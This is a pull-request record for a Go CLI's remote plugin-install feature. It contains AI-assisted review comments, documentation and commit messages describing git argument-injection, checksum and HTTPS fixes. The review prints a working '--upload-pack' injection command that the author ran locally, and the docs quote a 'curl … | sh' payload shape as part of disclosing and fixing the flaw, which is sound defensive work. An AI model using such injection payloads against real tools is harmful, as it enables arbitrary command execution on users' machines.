{"additions":4063,"baseRefName":"main","body":"## Summary

Expands the kubectl-style external-command layer so users can discover and install plugins without cloning anything, from any git host, with dependencies between plugins (e.g. `entire-brain` needs `entire-sem`).

- **Remote install** — `entire plugin install <name|url|path>`. Newest semver tag via `git ls-remote` (forge-agnostic, inherits git auth/proxies; no forge REST client anywhere). Optional `entire-plugin.yml` metadata read via blobless shallow clone. Release assets downloaded through a small per-host URL convention table (GitHub/Gitea-style, GitLab-style, `download_url` template escape hatch), selected and verified via the release's `checksums.txt` when published, with goreleaser-convention probing as fallback. Binaries land in `pkg/<name>/` with a provenance `manifest.yml`; `bin/` stays the only dispatch surface and the resolver in `plugin.go` is untouched.
- **Upgrade** — `entire plugin upgrade [name|--all]`, `--pin` to hold a tag, next-highest-tag fallback for pushed-but-unpublished releases, Windows locked-binary rename-aside.
- **Discovery** — krew-style git-synced index ([entireio/plugin-index](https://github.com/entireio/plugin-index)): shallow-cloned into the user cache keyed by URL hash, TTL refresh (`plugins.index_ttl_hours`, default 24h), stale-copy-on-offline. New `search`/`info`/`browse`/`index update` subcommands; bare-name installs resolve through the index; non-index URLs need TTY confirmation or `--yes`. Index URL precedence: `--index` > `ENTIRE_PLUGIN_INDEX_URL` > `plugins.index_url` settings > built-in default — the repo-level setting lets a company commit an internal catalog.
- **Dependencies** — `entire-plugin.yml` `requires` (name, repo_url, `min_version` only, no ranges). Install-time transitive planning (metadata-only, cycle-bounded), apt-style single confirmation, remove guard for depended-on plugins, and `entire plugin doctor` (missing/outdated deps, manifest drift, dangling symlinks, macOS quarantine). Dispatch stays zero-cost — no runtime dependency checks.

## Design notes

- Built on the recorded founding decisions of this layer: PATH dispatch unchanged, built-ins win, `agent-` prefix reserved, env filtering untouched, no new telemetry (official-allowlist posture unchanged).
- The only forge-specific code is the download-URL convention table; version listing, metadata, and the index all ride on the git protocol. No `go-github`-class dependency added (uses existing `gopkg.in/yaml.v3` + `golang.org/x/mod`).

## Testing

- ~40 unit tests against `file://` git repos and `httptest` asset servers (zero real network in CI), covering tag resolution, asset selection/verification, extraction guards, index sync/TTL/offline, dependency planning, doctor.
- 4 integration tests drive the spawned binary end-to-end: bare-name install → real dispatch of the downloaded plugin → dependency install → remove guard → doctor exit code.
- `mise run check` green (fmt, lint, unit + integration + Vogon canary).
- Validated against production: `entire-run` and `entire-upgrade` v0.1.0 published via goreleaser; a branch build with no overrides synced the real index and installed/dispatched `entire-upgrade` from its GitHub release.

## Docs

- `docs/architecture/external-commands.md` — new Remote install / Plugin index / Dependencies sections + key-file map.
- README — user-facing Plugins section.
- [entireio/plugin-index README](https://github.com/entireio/plugin-index) — schema and contribution guide.

Pull request overview

Expands the existing kubectl-style external-command layer to support a full plugin lifecycle: remote installs/upgrades (via git tag resolution + release asset download), discovery via a git-synced plugin index, and install-time dependency planning with a `plugin doctor` health check.

- Add remote plugin install/upgrade plumbing (git `ls-remote` tag resolution, optional `entire-plugin.yml` metadata fetch, release asset download + extraction, provenance manifests).
- Add plugin index sync/search/info/browse/index-update flows with settings/env/flag precedence and TTL-based refresh.
- Add dependency planning/execution + remove guard + `plugin doctor`, plus docs/README updates and new unit/integration tests.

content.text:
Your working tree is untouched — I did all verification in a throwaway worktree.

## PR #1422 — `ashtom/plugin-index`

Draft, 2053 commits behind main, last touched 2026-06-12 (~7.5 weeks). ~4,100 lines across 20 files. All 13 bot review threads (Bugbot ×11, Copilot ×2) are **resolved** — there's no outstanding human review, so nothing is waiting on you there.

## Merge status: better than the "CONFLICTING" label suggests

I merged `origin/main` in a scratch worktree. Only **two conflicts, both trivial** — each is "both sides added a line in the same spot":

- `cmd/entire/cli/settings/settings.go:147` — your `Plugins *PluginSettings` field vs main's new `Checkpoints *CheckpointsConfig`. Keep both.
- `README.md:304` — your `entire plugin` command-table row vs main's new `org`/`project`/`repo`/`grant` rows. Keep both (`plugin` sorts after `org`).

After resolving: `go build ./...` clean, `go test ./cmd/entire/cli/ -run Plugin` passes, `./cmd/entire/cli/settings/` passes, and the plugin integration tests pass. Everything the PR depends on still exists in main — `NewAccessibleForm`, `handleFormCancellation`, `NewSilentError`, `interactive.CanPromptInteractively`, `userdirs.Cache()`, all the `plugin_store.go` helpers, `mergeInvestigate` (the pattern `mergePlugins` parallels), and the `golang.org/x/mod` + `yaml.v3` deps. `docs/architecture/external-commands.md` is untouched in main, so the doc additions apply cleanly.

**Two new lint failures**, both caused by main's `bf0c56b1c` ("lint build-tagged files and fix the 292 issues that surfaced") — integration tests are now linted, and yours never was:

```
integration_test/plugin_remote_install_test.go:130:21: string `windows` has 4 occurrences,
    but such constant `windowsGOOS` already exists (goconst)
integration_test/plugin_remote_install_test.go:103:62: pluginTestEnv - result 1 (string)
    is never used (unparam)
```

Main added `windowsGOOS` to `integration_test/testconsts.go`; use it. And `pluginTestEnv`'s second return is `_` at all four call sites — drop it. Five minutes of work, but CI blocks without it.

## Implementation review

The design is genuinely good — git-protocol-only version resolution, no forge REST client, `bin/` untouched as the sole dispatch surface, manifests-record-facts vs settings-configure-behavior. Test coverage is real (`file://` repos + `httptest`, no network). One serious finding, though.

### 🔴 Argument injection → arbitrary command execution via unvalidated repo URLs

`repo_url` from the index and from a plugin's `entire-plugin.yml` is passed straight to `git` as a positional with no `--` separator and no scheme validation:

- `plugin_gitremote.go:37` — `gitQuiet(ctx, "ls-remote", "--tags", "--refs", repoURL)`
- `plugin_gitremote.go:95` — `append(args, repoURL, tmp)` (clone)
- `plugin_index.go:184` — `gitQuiet(ctx, "clone", ..., indexURL, dir)`

`loadPluginIndexFromDir` validates `e.Name` via `validatePluginName` and rejects empty `RepoURL` — but never checks that it *looks like a URL*. `ParsePluginMetadata` likewise validates `meta.Name` and `req.Name`, never `req.RepoURL`. Git parses an option-shaped positional as an option, and `--upload-pack`'s value **is shell-interpreted**. I verified this end to end:

```
$ git ls-remote --tags --refs "--upload-pack=touch ../pwned2.txt; git-upload-pack"
From ../remote.git
$ ls ../pwned2.txt
-rw-r--r--  1 soph  wheel  0 Aug  4 20:28 ../pwned2.txt   # executed
```

With no positional repo left, git falls back to the CWD repo's `origin` — so this fires whenever the user is inside a git repo with a local or SSH origin. Two reachable paths, and neither prompts:

1. **Index entry** — index-resolved names set `trusted = true` in `runRemoteInstall`, so `entire plugin install <name>` runs `listRemoteSemverTags` with **no confirmation at all**. A repo that commits `plugins.index_url` in `.entire/settings.json` (an explicitly designed feature) points contributors at an attacker-chosen catalog. `PluginSettings.Validate()` does gate `index_url` to a scheme allowlist, which blocks injecting *there* — but the entries that catalog serves are ungated.
2. **Dependency metadata** — `requires[].repo_url` reaches `listRemoteSemverTags` at `plugin_deps.go:131` during *planning*, which runs **before** the apt-style confirmation prompt. So a compromised release of an otherwise legitimately-indexed plugin gets execution on the next install.

Also unvalidated: `--index` and `ENTIRE_PLUGIN_INDEX_URL` (only the settings path gets `Validate()`).

The fix is small and already has a precedent in your own code — `validatePluginName` rejects a leading `-` precisely because you thought about this for names. Extend the same reasoning to URLs:

- Add a `validateRepoURL` reusing `PluginSettings.Validate`'s scheme allowlist (`https://`, `ssh://`, `git://`, `file://`, `git@host:path`), and call it in `loadPluginIndexFromDir`, `ParsePluginMetadata` (for `req.RepoURL`), `resolvePluginIndexURL` (flag + env), and the user-URL install path.
- Belt-and-braces: insert `--` before positionals. I confirmed both forms block cleanly — `git ls-remote --tags --refs -- "<payload>"` → `fatal: strange pathname ... blocked`; `git clone --depth 1 --quiet -- "<payload>" dir` → `fatal: repository ... does not exist`.

### 🟡 Index `version != 1` hard-fails every older CLI

`plugin_index.go:231` errors out on any version but 1. The struct comment two lines up says decoding is lenient "so an index that grows new fields doesn't break older CLI versions fleet-wide" — but the version gate means the day anyone bumps `version` to 2, every deployed CLI loses discovery entirely, including bare-name installs. Since the index is one shared fleet-wide resource, consider accepting `<= 1` (or gating per-entry) so a bump degrades instead of bricking.

### 🟡 Trust model gaps worth stating explicitly

Not bugs given krew-equivalent posture, but they should be conscious:
- The probe fallback (`plugin_fetch.go:231-243`) passes `wantDigest: ""` — releases without a `checksums.txt` are installed **unverified**. Combined with the round-five change (a manifest listing nothing for the platform now falls through to probing), a manifest that simply omits your platform silently downgrades you to no verification.
- `releaseAssetBaseURL` accepts `http://` (line 53), so both asset and checksum manifest can travel plaintext from the same origin — MITM defeats verification wholesale. Requiring `https` with a loopback carve-out would keep your `httptest`-based tests working.
- There's no signature verification anywhere; trust is "whoever controls the release host." Fine, but worth one line in `external-commands.md`.

### 🟢 Smaller things

- **`download_url` with a query string breaks archive detection.** The single-URL path does `fetchAndVerify(ctx, u, path.Base(u), ...)`, and `path.Base` only splits on `/`: `https://ex.com/rel/entire-foo.tar.gz?token=abc` → `entire-foo.tar.gz?token=abc`. That fails `extractPluginBinary`'s `.tar.gz` suffix check, so the archive is copied verbatim as the binary — a silently broken plugin. (On Windows, `?` also makes `os.Create` fail.) Strip the query/fragment before taking the base.
- **`manifest.yml`'s `SHA256` is recorded but never re-verified.** The PR body lists "manifest drift" among doctor's checks; doctor checks *presence* (manifest without a bin entry), not integrity. Either re-hash the pkg binary in doctor or soften the claim.
- **Dependency upgrades don't confirm they reached `min_version`.** `ExecuteDepPlan` installs the newest tag; if that's still below `min_version`, the install reports success and only doctor notices later.

## Ecosystem drift you'll want to think about

The plugin ecosystem became real while this sat, which strengthens the case for landing it — but creates two seams:

- **`entire-ci` is now in `officialPlugins`** (`plugin_official.go`, main's `14515cc2a`) — a hardcoded telemetry allowlist. Your `PluginIndexEntry.Official` is a separate, index-driven flag that doesn't feed telemetry. Two sources of truth for "official" that can disagree. Worth reconciling, or at least renaming one.
- **`entire-upgrade` is now the CLI's self-update mechanism**, with `selfUpdatePluginName = "upgrade"` special-cased in `plugin.go` (main's `5e12b0cac`). So `entire upgrade` upgrades *the CLI* while your new `entire plugin upgrade` upgrades *plugins* — collision-free mechanically, but confusable. And the index should probably now list `ci` and `upgrade`.

## What I'd do

Merge is cheap; the blocker list is short. In order: fix the two lint errors, land the URL validation + `--` separators (with a regression test — it's the one finding I'd call a must-fix before this leaves draft), then decide on the index-version gate. The rest can be follow-ups or doc changes. Want me to apply the merge resolution and the fixes?

Remote installs are deliberately forge-agnostic:

1. **Version resolution** uses `git ls-remote --tags` — identical on GitHub, GitLab, Gitea/Forgejo, and self-hosted servers; inherits the user's git auth and proxy config. The highest semver tag wins; `--pin <tag>` installs exactly that tag and marks the manifest pinned (skipped by `upgrade`).
2. **Metadata** is read from `entire-plugin.yml` at the repo root via a blobless shallow clone (with a plain shallow-clone fallback for servers that don't allow partial-clone filters). The file is optional; without it the plugin name derives from the repo basename (`entire-run` → `run`).
3. **Asset download** is the one forge-specific step, contained in a small URL-convention table: GitHub/Gitea-style `<repo>/releases/download/<tag>/<asset>`, GitLab-style `<repo>/-/releases/<tag>/downloads/<asset>`, unknown hosts default to GitHub-style. Authors on other hosts declare a `download_url` template in `entire-plugin.yml` (placeholders: `{name}` `{tag}` `{version}` `{os}` `{arch}` `{asset}`).
4. **Asset selection** prefers the release's `checksums.txt`: the manifest lists what was actually published, and the download is verified against it. Without one, goreleaser-conventional candidate names are probed (`entire-<name>_<version>_<os>_<arch>.tar.gz` and friends, with `x86_64`/`aarch64` aliases and a `darwin_all` universal-binary fallback). A pushed tag with no published assets falls back to the next-highest tag with a warning.
5. The binary lands in `pkg/<name>/` next to a `manifest.yml` recording provenance (repo URL, tag, asset, SHA-256, pin state, dependency list), and is linked into `bin/` through the same symlink→hardlink→copy fallback as local installs. The dispatcher never changes.

Installing from a URL not listed in the index prints the source and asks for confirmation (`--yes` to skip; required in non-interactive runs). Index-listed repos install without prompting.

### Plugin index (discovery)

Discovery rides on a git-synced index, krew-style: the index is itself a git repository containing `index.json`, shallow-cloned into the user cache (keyed by a hash of the URL) and refreshed on a TTL. `entire plugin search [term]`, `info <name>`, and `browse` read it; `entire plugin index update` forces a refresh. When a refresh fails but a cached copy exists, the stale copy is used — discovery doesn't hard-fail offline.

The effective index URL resolves as: `--index` flag > `ENTIRE_PLUGIN_INDEX_URL` > `plugins.index_url` in `.entire/settings.local.json`/`.entire/settings.json` > the built-in default (`https://github.com/entireio/plugin-index`). The repo-level setting is deliberate: a company can commit `plugins.index_url` to point contributors at an internal catalog. `plugins.index_ttl_hours` tunes freshness (default 24).

`index.json` schema (version 1): `{"version": 1, "plugins": [{"name", "repo_url", "description", "official", "platforms"}]}`. Entries with invalid names (e.g. the reserved `agent-` prefix) or missing repo URLs are filtered on load, not fatal.

Installing from a URL not listed in the index prints the source and asks for confirmation (`--yes` to skip; required in non-interactive runs). Index-listed repos install without prompting.

#### Repository URLs are a security boundary

Every repo URL is validated by `validatePluginRepoURL` before it reaches the git CLI, and every git invocation passes `--` before its positionals. Both layers exist because repo URLs are attacker-influenced: they arrive from `index.json` entries, from another plugin's `requires[].repo_url`, and from `--index`/`ENTIRE_PLUGIN_INDEX_URL`.

git parses an option-shaped positional as an option, and `--upload-pack=<cmd>` is shell-interpreted — with no positional repository left, it runs against the *ambient* repo's `origin`. So a catalog entry like `--upload-pack=curl … | sh; git-upload-pack` would execute arbitrary commands during an index-resolved install, which by design never prompts. Dependency planning is the tightest path: it inspects `requires[].repo_url` *before* the install confirmation.

Accepted forms are `https://`, `http://`, `ssh://`, `git://`, `file://`, git's `user@host:path` scp-like syntax, and absolute local paths. Anything else — a leading `-`, a bare name, a relative path, git's command-executing `ext::` transport — is rejected. Invalid index entries are dropped like invalid names (one bad row can't take out the catalog); an invalid `requires[].repo_url` fails metadata parsing, surfacing the author's mistake at install time.

This mirrors `validatePluginName`, which refuses a leading `-` on names for the same reason. Regression coverage asserts the payload never executes, not merely that the call errors.

inspects requires[].repo_url before the install confirmation prompt.

Two independent layers, either of which is sufficient:

- validatePluginRepoURL gates every URL to https/http/ssh/git/file

  but the allowlist doesn't rely on that policy).
- Every git invocation now passes "--" before its positionals.

fetchPluginMetadataAtTag, SyncPluginIndex) so all callers are covered,
and at the parse boundaries for better errors: bad index entries are

We don't. I'd drop it, and the omitted case is why:

```
version omitted → "plugin index <url> declares unsupported version 0
                   (this CLI understands 1; upgrade entire?)"
version: 2      → same hard failure
version: 1      → ok
```

A hand-written internal catalog that forgets `"version": 1` gets told to **upgrade the CLI**, which will never fix it. And hand-written internal catalogs are precisely the designed use case for the repo-level `plugins.index_url` setting you built.

The deeper problem is that **the gate protects against a migration you can never perform.** The index is one shared resource read by every CLI version ever shipped. Bumping to `2` breaks discovery for every older binary instantly — no gradual rollout, no undo for what's already installed. So the realistic answer to an incompatible schema change isn't "bump the version," it's "publish `index-v2.json`, or a new branch, or a new repo" — none of which need a version field in the file. Since you'd never bump it deliberately, its only realistic way of firing is by accident: a typo, a generator writing the wrong value, or the omission above. That's pure downside.

Meanwhile the case that *does* happen — adding fields like `homepage`, `maintainer`, `deprecated` — is already handled without it, by the lenient decoding you deliberately chose plus per-entry validation dropping bad rows.

What the gate genuinely buys is narrow: if a *required* field were renamed or removed, an old client would show a silently empty catalog instead of a clear error. Real, but hypothetical, and it's the same scenario you'd architect around with a new path. For a discovery feature I'd rather have entry-level degradation (skip rows you can't read, keep the rest) than catalog-level refusal — partial function beats total failure. That's also closer to krew's actual precedent, where the `apiVersion` lives in each per-plugin manifest rather than gating the whole catalog.

So my recommendation: **keep `version` in the schema, stop gating reads on it.** Accept any value including absent, let per-entry validation do the real work, and log a warning (not an error) when it's greater than 1 so there's still a breadcrumb if something's genuinely off. That kills the footgun without removing a field from a published format or giving up the option to branch on it later.

### Dependencies

A plugin declares dependencies in `entire-plugin.yml`:

```yaml
name: brain
requires:
  - name: sem
    repo_url: https://github.com/entireio/entire-sem  # where to get it if missing
    min_version: v0.2.0                                # minimum only; no ranges
```

Resolution is **install-time only** — dispatch stays zero-cost. After installing the main plugin, missing dependencies are resolved transitively (metadata-only, nothing downloaded during planning; a visited set plus depth bound make metadata cycles an error, not a hang), listed apt-style, and installed after one confirmation (`--yes` skips, `--no-deps` opts out). A declined plan is a warning, not a failure. Dependencies already satisfied from raw `$PATH` or a local-dev install count as satisfied, with a warning when `min_version` can't be verified. The requirement list is copied into the install manifest so reverse-dependency checks work offline:

- `entire plugin remove sem` refuses when another manifest requires it (`--force` overrides).
- `entire plugin doctor` reports missing/outdated dependencies, manifest/bin-dir drift, dangling local-dev symlinks, and (macOS) a `com.apple.quarantine` attribute that would block execution. Exit code 1 when issues are found.

> **Compatibility note:** the `entire plugin` command group is itself a built-in. Per the "built-ins win" rule above, it shadows any external command named `entire-plugin` that may have existed on `$PATH` previously. The collision is intentional — managing plugins is a built-in concern — but worth flagging for anyone who shipped an `entire-plugin` external command before this layer landed.

## Environment

## Plugins

Plugins extend the CLI with new verbs: any executable named `entire-<name>` on `$PATH` runs as `entire <name>`, kubectl-style — stdio passes through, exit codes propagate, no SDK or protocol required.

```sh
entire plugin search                                    # browse the plugin index
entire plugin install upgrade                           # install by name (index lookup)
entire plugin install https://github.com/you/entire-x   # install from any git host
entire plugin install ./dist/entire-x                   # link a local build
entire upgrade                                          # run an installed plugin
entire plugin upgrade --all                             # update remote-installed plugins
entire plugin doctor                                    # check for broken installs and missing dependencies
entire plugin remove x
```

Remote installs are forge-agnostic: the newest semver tag is resolved over the git protocol, and the platform's release asset is downloaded and verified against the release's `checksums.txt`. Plugins can declare dependencies on other plugins in an `entire-plugin.yml`; missing ones are installed after a single confirmation.

Discovery uses a git-synced catalog, [entireio/plugin-index](https://github.com/entireio/plugin-index) by default. Organizations can point the CLI at an internal catalog via `plugins.index_url` in `.entire/settings.json`, the `ENTIRE_PLUGIN_INDEX_URL` environment variable, or `--index`.

For the full contract — resolution rules, environment filtering, release-asset conventions, and how to author a plugin — see [External Commands](docs/architecture/external-commands.md).

## Configuration

Three gaps in the remote-install supply chain, all on the path that ends in
making a downloaded file executable.

HTTPS is now required. Plaintext HTTP was accepted, and because the asset
and the checksums.txt authenticating it come from the same origin, an
attacker who could rewrite one could rewrite both — checksum verification
proved nothing. Enforced at the HTTP boundary (httpGetSmall and
fetchAndVerify) so it also covers the author-declared download_url escape
hatch, not just the derived forge URLs. Loopback is exempt: httptest
fixtures and local forge experiments have no network attacker to defend
against.

Unauthenticated downloads are refused by default. Previously a release
publishing no checksums.txt silently fell through to probing candidate
names and installing whatever arrived. Now that needs --allow-unverified,
which is recorded in the manifest, reported by doctor until the author
publishes checksums, and inherited by upgrade — so a knowingly-unverified
plugin doesn't start failing on upgrade, and a verified one can't silently
become unverified. The same gate covers a download_url with no {asset}
placeholder, which is unverifiable by construction.

The candidate probe still runs when verification is required, because it
separates "no release published for this tag yet" (errAssetNotFound, worth
walking down to the next tag) from "release exists but publishes no
checksums" (errUnverifiedAsset, which an older tag would not fix).
Collapsing those would report a missing release for a plugin that simply
ships no checksums.

Installed binaries are now digested and re-checked. manifest.SHA256 covers
the downloaded asset — usually an archive, discarded with the staging dir —
so it recorded provenance but could never detect tampering of the thing
actually executed, which is why doctor had no integrity check. Installs now
also record BinarySHA256 for the binary under pkg/<name>/, and doctor
re-hashes it to catch a binary modified or replaced outside entire. A
manifest without the field predates this and is skipped rather than nagged

All three addressed. `mise run test:ci` exits 0, lint 0 issues, tree clean.

**HTTPS required.** Enforced in `httpGetSmall` and `fetchAndVerify` rather than in `releaseAssetBaseURL` — that placement matters, because the author-declared `download_url` bypasses the forge URL table entirely, so gating only there would have left the escape hatch open. Loopback (`127.0.0.1`, `::1`, `localhost`) is exempt so `httptest` fixtures keep working. Verified against a real run:

```
install plugin: refusing to download http://plugins.example.com/dl/entire-smoke_1.0.0_darwin_arm64.tar.gz
over plaintext HTTP: the asset and its checksums.txt would share an origin, so a network attacker
could replace both and checksum verification would prove nothing; serve the release over HTTPS or
declare an https download_url in entire-plugin.yml
```

**Unverified downloads refused by default,** with `--allow-unverified` as the opt-in — recorded in the manifest, reported by doctor until the author publishes checksums, and inherited by `upgrade` so a knowingly-unverified plugin doesn't start failing later and a verified one can't silently downgrade. The same gate catches a `download_url` with no `{asset}` placeholder, which can't locate a manifest by construction.

One subtlety worth flagging: I kept the candidate probe running even when verification is required. It's what distinguishes *no release published yet* (`errAssetNotFound`, which should walk down to the next tag) from *release exists but ships no checksums* (`errUnverifiedAsset`, which an older tag wouldn't fix). Collapsing them would have reported a missing release for any plugin that simply doesn't publish checksums, and silently broken the next-highest-tag fallback. `TestDownloadPluginAsset_NoAssetForPlatform` now pins that distinction.

**Doctor re-verifies installed binaries** — and this needed a new field, which is the part that changes the earlier picture. `manifest.SHA256` covers the *downloaded asset*, normally an archive that's discarded with the staging dir, so there was nothing left to compare against; that's why the integrity check was never implementable as the PR body implied. Installs now also record `BinarySHA256` for the binary under `pkg/<name>/`, and doctor re-hashes it. The test asserts both directions — intact binary stays quiet, swapped binary is caught — plus that a manifest predating the field is skipped rather than nagged about.

Two things I changed beyond the literal ask, both to avoid leaving the tree worse:
- Both release test servers now publish `checksums.txt`. Without that they'd have exercised only the new refusal path; now the end-to-end tests run the verified path production uses — and since no test passes `--allow-unverified`, their passing *is* the proof that verification succeeds.
- `entire-<name>[.exe]` was constructed in three places; lint's `.exe` count surfaced it, so it collapsed into `pluginBinaryName`.

Branch is 6 commits ahead of `origin/main`, nothing pushed.

Two open items remain from the original review, both design seams rather than defects: post-install `min_version` confirmation for dependency upgrades, and the two sources of truth for "official" (`officialPlugins` telemetry allowlist vs the index flag).

One caveat on the default-deny choice: any plugin whose releases lack `checksums.txt` now needs `--allow-unverified`, so if you have real plugins in that state — or want the index's curated entries held to checksums while arbitrary URLs only warn — say so and I'll soften it to warn-only. Otherwise, want me to push and take #1422 out of draft?
yes, push and take it out of draft

## Un-drafted after a review pass and a merge with main

This sat for ~7.5 weeks, so I reviewed the implementation, merged current `main` into it, and fixed what the review turned up. **The Summary and Testing sections above describe the pre-merge state and are now stale** — this comment is the current picture.

`main` moved 2053 commits in the meantime. Both merge conflicts were "both sides added a line in the same place": `Plugins` next to main's new `Checkpoints` field in `EntireSettings`, and the `entire plugin` README row next to main's new `org`/`project`/`repo`/`grant` rows.

### ⚠️ Please read `ac0d13e29` closely — argument injection into the git CLI

Repo URLs were passed to `git ls-remote` and `git clone` as bare positionals with no validation. They are attacker-influenced: they arrive from `index.json` entries, from another plugin's `requires[].repo_url`, and from `--index` / `ENTIRE_PLUGIN_INDEX_URL`.

git parses an option-shaped positional as an option, and `--upload-pack`'s value **is shell-interpreted**. With no positional repository left, git falls back to the ambient repo's `origin` and runs the payload. So an index entry of `--upload-pack=curl … | sh; git-upload-pack` executed arbitrary commands during `entire plugin install <name>` — a path that is treated as trusted and **never prompts**. Dependency planning was tighter still: it inspects `requires[].repo_url` *before* the install confirmation.

I confirmed this was live on the pre-fix tree before fixing it — the regression test asserts the payload never executes, not merely that the call errors, and it reports the marker file being created when run against the old code.

Two independent layers now, either sufficient alone: a scheme allowlist (`validatePluginRepoURL`) applied at the sinks and at the parse boundaries, plus `--` before every git positional. This mirrors `validatePluginName`, which already refused a leading `-` on names for exactly this reason.

### Behavior change worth a decision: checksums now required by default (`26b10db99`)

A release publishing no `checksums.txt` previously fell through to probing candidate names and installing whatever arrived. That now needs `--allow-unverified`, recorded in the manifest, reported by `doctor`, and inherited by `upgrade`. Plaintext HTTP is also refused for non-loopback hosts, because the asset and the `checksums.txt` authenticating it share an origin — an attacker who can rewrite one can rewrite both.

**This is the change most likely to want discussion.** It's easy to soften to warn-only, or to require checksums only for index-listed plugins. Flagging it rather than assuming.

Also in that commit: `manifest.SHA256` covers the *downloaded asset*, which is usually an archive discarded with the staging dir — so it recorded provenance but could never detect tampering of the binary actually executed, which is why `doctor` had no integrity check. Installs now also record `BinarySHA256` for the binary under `pkg/<name>/`, and `doctor` re-hashes it.

### Other commits

- `0636c621b` — the index `version != 1` gate is now advisory. It guarded a migration that can never happen (the index is one shared resource read by every shipped CLI, so a bump breaks discovery fleet-wide), while punishing the case that does: an index omitting the field decoded to `0` and told the author to *upgrade the CLI*. Hand-written internal catalogs are exactly what the repo-level `plugins.index_url` setting is for.
- `56a063e4b` — a fixed `download_url` carrying a query string yielded `entire-run.tar.gz?token=abc` from `path.Base`, missing the archive-extension sniff and getting written out verbatim as the binary.
- `2ac8323f9` — two lint errors from main's `bf0c56b1c`, which brought build-tagged files under golangci-lint after this branch was written.

### Testing

`mise run check` green locally; all GitHub checks green here, including `test-windows` and both `test-canary` variants, which did not exist when this branch was last touched. Both release test servers now publish `checksums.txt`, so the end-to-end tests exercise the verified path production uses — no test passes `--allow-unverified`, so their passing is the proof that verification succeeds.

### Still open (deliberately not addressed)

- Dependency upgrades install the newest tag without confirming `min_version` was actually reached; only `doctor` notices.
- Two sources of truth for "official": main's `officialPlugins` telemetry allowlist (now holding `"ci"`) vs the index's `official` flag.
- `entire upgrade` (CLI self-update, special-cased in `plugin.go` since main's `5e12b0cac`) vs `entire plugin upgrade` (plugins) — collision-free mechanically, confusable in docs.
- The index should probably now list `ci` and `upgrade`, both of which shipped while this was open.

git add -A && git commit -q --no-verify -F - <<'MSG'
Address trail #973 findings: extraction truncation, index cache locking

Two medium findings from the agent review, both verified against the code
before fixing and both covered by tests that fail without the fix.

Silent truncation in archive extraction. extractFromTarGz/extractFromZip
capped the copy with io.LimitReader(entry, maxPluginAssetSize) and never
checked whether the entry had actually exceeded it. io.Copy through a bare
LimitReader returns a nil error at the limit, so an archive entry larger
than 512 MiB was truncated to exactly the cap and written out as the plugin
binary with the install reporting success. Reachable: the download cap
bounds the compressed archive, not what it expands to, so a few-KB
tar.gz of compressible data clears it.

The interaction with binary_sha256 made this worse than it looks — the
digest is computed from the bytes on disk, so doctor would have confirmed
the truncated binary as intact.

The cap now lives in writeExecutable, which reads one byte past it and
errors on overflow, mirroring fetchAndVerify's existing +1 pattern. Callers
hand over the raw reader rather than pre-limiting it, so all three
extraction paths (tar.gz, zip, raw binary) inherit the check.
writeExecutableLimited takes the bound explicitly so the oversize path is
testable without materializing 512 MiB.

No locking on the shared plugin-index cache. SyncPluginIndex mutated the
per-URL cache dir destructively — RemoveAll + clone cold, fetch + reset
--hard warm — with no lock, unlike discovery/cache.go which flock-guards
its shared cache files. Concurrent `entire plugin` invocations could race:
one cloning while another reads index.json surfaces a spurious "no readable
index.json", and two cold syncs racing leave exactly the half-created
directory the existing sweep was added to recover from.

The whole sync-and-read now runs under flock.AcquireContext, which honors
ctx so an interrupted wait still cancels. The lock file is a sibling of the
cache dir rather than inside it, since RemoveAll on the dir would otherwise
delete the lock while it is held. Six concurrent cold syncs fail without
this ("destination path already exists and is not an empty directory") and
pass with it.

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>
MSG

The review loop has converged — **no open findings** on the current head.

## What the trail turned up

Four medium findings across three review rounds, each one verified against the code before I touched it, and each fix carries a test I confirmed fails without it.

**Round 1 — two findings, both real:**

*Silent truncation in archive extraction* (`plugin_fetch.go`). `extractFromTarGz`/`extractFromZip` capped the copy with a bare `io.LimitReader` and never checked whether the entry had exceeded it — `io.Copy` returns nil at the limit, so an entry over 512 MiB was truncated and installed as the plugin binary with the install reporting success. Reachable, because the download cap bounds the *compressed* archive, not what it expands to. The nasty part was the interaction with the `binary_sha256` I'd added an hour earlier: the digest is computed from the bytes on disk, so `doctor` would have confirmed the corrupt binary as intact. The cap moved into `writeExecutable` with the `+1` overflow check that `fetchAndVerify` already used.

*No locking on the shared index cache* (`plugin_index.go`). `SyncPluginIndex` mutated the per-URL cache destructively with no lock, unlike `discovery/cache.go` which flock-guards its shared files. Six concurrent cold syncs fail without the fix — `destination path already exists and is not an empty directory` — and pass with it. The lock file is a sibling of the cache dir, since `RemoveAll` would otherwise delete the lock while held.

**Round 2 — one finding, real but with a wrong conclusion.** `planDeps` kept a name-only visited set, so in a diamond (A needs `sem >= v1.0.0`, B needs `sem >= v2.0.0`, `sem` at v1.5.0) the satisfied requirement closed the name off and B's stricter one was skipped — zero actions, zero warnings, verified. But the finding claimed `doctor` would never catch it; that's wrong, and I said so on the trail. `RunPluginDoctor` walks each manifest's requirements with no visited set and does report it. So the defect was late discovery, not silence — still worth fixing, just not the escalation it was framed as.

**Round 3 — one finding, and the sharpest of the four.** `DepAction.FromIndex` was written by `planDeps` and **never read by any production path** — a trust signal tracked but never wired up. The consequence: a dependency whose `repo_url` is declared by the requiring plugin's author downloaded a binary behind only the generic "Install them now?", while a URL the *user* typed gets an explicit "not listed in the plugin index" prompt. Same attacker-influenced input, less visibility. I kept the apt-style single confirmation and made it informed, and derived `FromIndex` from the resolved URL on every branch — the upgrade branch never set it, so upgrades would have reported as unlisted regardless of origin.

input.prompt:
You are performing an ADVERSARIAL security review. Your job is to BREAK this feature, not to bless it. Assume it is insecure and find out how.

## Context

Repo: `/Users/soph/Work/entire/devenv/cli_experiments_2` (Go CLI, branch `ashtom/plugin-index`, PR #1422).
See the net change with: `git diff origin/main...HEAD` (20 files, ~5100 insertions).

The feature: a plugin system for the `entire` CLI. `entire <name>` execs `entire-<name>` from PATH (kubectl-style). This PR adds: remote install from any git host (`entire plugin install <name|url|path>`), a krew-style git-synced plugin index (`index.json` in a git repo, shallow-cloned into the user cache), plugin dependencies via `entire-plugin.yml` `requires[]`, `plugin upgrade`, and `plugin doctor`.

Key files: `cmd/entire/cli/plugin_fetch.go` (download/verify/extract), `plugin_gitremote.go` (git shell-outs, URL validation), `plugin_index.go` (index sync), `plugin_install_remote.go` (install orchestration), `plugin_deps.go` (dependency planning, doctor), `plugin_group.go` (commands/prompts), `plugin_manifest.go` (manifests/metadata parsing), `settings/settings.go`. Docs: `docs/architecture/external-commands.md`.

**This code ends in downloading a binary and making it executable.** That is the whole threat surface. Treat every input reaching it as hostile.

## Trust boundaries you should map and attack

Attacker-controlled or attacker-influenced inputs:
